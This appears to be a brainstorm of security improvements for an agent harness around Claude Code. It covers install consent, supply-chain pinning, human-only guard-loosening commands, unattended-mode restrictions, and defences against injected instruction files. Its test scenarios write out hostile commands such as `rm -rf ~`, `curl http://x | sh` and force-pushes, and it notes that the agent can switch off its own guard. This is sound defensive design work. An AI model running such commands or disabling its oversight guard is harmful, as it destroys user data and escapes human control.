# Brainstorm — lens: security and safety

- **Show a plan and take consent before install touches `~/.claude`** — SECURITY — value 5 — effort M — risk low — category: install trust
  Why: evidence A2/A10. The default install sets `bypassPermissions`, 20 deny rules, the statusline and third-party plugins, and the output only says "Claude Code asks you to confirm once". `install.sh --plan` would list every file and setting it will change, and each plugin with the hooks it adds. The installer would then ask once, keep bypass opt-in, and save the prior values to a receipt so uninstall restores them exactly (no more "defaultMode = None").
  Done when: in a clean HOME, `install.sh --plan` writes nothing and lists every path it would touch; a real install followed by uninstall leaves `~/.claude` byte-identical to its start.

- **Pin and verify everything the installer downloads or self-updates** — SECURITY — value 5 — effort M — risk med — category: supply chain
  Why: `curl | bash` pulls `main`, then uv or Homebrew Python, then plugins, with bypass on afterwards. Foreman's own update is a `git pull` into `~/.claude/foreman`, whose hooks then run unattended. Plan: pin plugins by commit sha, check a checksum on `install.sh` and uv, update fast-forward-only to a tagged release, and show the hook/guard diff before activating. Add a "download, read, run" mode (`--verify`).
  Done when: a tampered plugin tarball or a force-pushed `main` makes the installer or update stop with a named mismatch and the old version stays live.

- **Make safety-loosening verbs human-only** — SECURITY — value 4 — effort S — risk low — category: self-protection
  Why: Claude calls `fm` through Bash, so the agent can run any verb that turns the guard off, widens autonomy or adds grants. Assumption: such verbs exist among the 108. Tag them in the registry. They would refuse unless stdin and stdout are a real tty and a typed phrase is entered, and they would be denied in the hook chain when invoked from a tool call.
  Done when: a test running each tagged verb through the Bash-hook path exits non-zero with "human-only"; the same verb in a tty with the phrase succeeds.

- **Tighten the guard automatically when nobody is watching** — FEATURE — value 4 — effort M — risk med — category: unattended safety
  Why: drive mode, JARVIS mail wakes and `fm night` run with no one to answer an ask, yet the guard posture is the same as when the user is present. A presence signal (last user prompt time, no pane activity) would switch to an unattended profile. That profile denies and parks the irreversible class instead of asking, and shows the parked items on return.
  Done when: with the presence timestamp older than the threshold, a `git push --force` is denied and parked; with a fresh prompt it asks as before.

- **Publish a safety scorecard against bare bypass mode** — FEATURE — value 4 — effort M — risk low — category: proof of value
  Why: evidence C says there is no published evidence Foreman helps, and the bench has 1 case. A table of about 100 dangerous scenarios (destructive git, rm variants, injected README, exfiltration to a URL, config tampering) would be run through bare bypass, Foreman, and ideally a rival hook profile. It would report block rate and false-positive rate on benign commands. A fresh install can run the same set against its own hook chain.
  Done when: `fm bench safety` prints block and false-positive rates per scenario class and fails if any previously blocked scenario passes.

- **Review instruction files that arrive by pull or checkout** — SECURITY — value 3 — effort M — risk low — category: injection
  Why: tracked `CLAUDE.md`, `.claude/`, briefs, rules and charter files become instructions the drive follows. A teammate's commit or a pulled branch can change them between sessions. Hash them at session end. If a hash changed without a local edit, show the diff and hold autonomy until one yes.
  Done when: after a simulated `git pull` changes `CLAUDE.md`, the next SessionStart reports the diff and the drive does not start until it is acknowledged.

- **Ship SBOM, build provenance and a vulnerability-report path** — SECURITY — value 3 — effort M — risk low — category: release trust
  Why: assumption: the repo is public (README install line) and the Desktop release pipeline is queued (T-0352). A release would carry a dependency list, a provenance attestation for the AppImage and plugin tarball, and a `SECURITY.md` with a private report route that files a ledger task.
  Done when: the release job uploads the SBOM and attestation, and `gh attestation verify` passes on the artifact.

- **Generate a one-screen "what Foreman can see and send" statement** — FEATURE — value 3 — effort S — risk low — category: privacy
  Why: the newcomer trust ask (A2) has no plain answer to "what leaves my machine". Build it from a registry of every outbound call (Artifact publish, push, `claude -p` children, install fetches) and every on-disk store, with each setting's default. Linking it from the README and the install plan avoids a hand-written claim that can drift.
  Done when: `fm privacy` lists each outbound channel with its default (on/off), and a test fails when code adds a network call not in the registry.

- **Wild: Expire bypass mode on a lease** — FEATURE — value 4 — effort S — risk med — category: trust lease
  Why: bypass is a set-once global switch. After 7 days with no renewal it would revert to the user's prior mode, and SessionStart would show "bypass: 5 days left". One keystroke renews it and one command ends it. This turns the large trust ask in A2 into a revocable one. wild
  Done when: with the lease clock past expiry, the next session starts in the saved prior permission mode and says so in one line.

- **Wild: `fm demo guard`, a 60-second safety demo with no model calls** — FEATURE — value 4 — effort M — risk low — category: onboarding
  Why: A1 says there is no 60-second demo. In a temp directory it would stage a fake `$HOME` and a README carrying an injected instruction, then run 5 scripted tool calls through the real hook chain (`rm -rf ~`, force-push, `curl | sh`, config edit, benign `ls`). It prints each verdict and reason, and cleans up. It doubles as an install self-test. wild
  Done when: the command exits 0 in under 10 seconds, shows 4 denied calls and 1 allowed call, makes no network or model call, and leaves no files outside its temp directory.

- **Wild: Run the guard over commands the user pastes into the prompt** — FEATURE — value 3 — effort M — risk med — category: intake safety
  Why: newcomers often paste "run this" snippets from READMEs or forums, and the model then runs them in bypass. At UserPromptSubmit, extract shell snippets and URLs from the user's message and run them through the guard. A risky one gets a one-line annotation ("this pipes a remote script to sh") before the model acts. Assumption: the intake hook can add context. wild
  Done when: a prompt containing `curl http://x | sh` yields a risk note in the injected context, and a prompt with `ls -la` yields nothing.
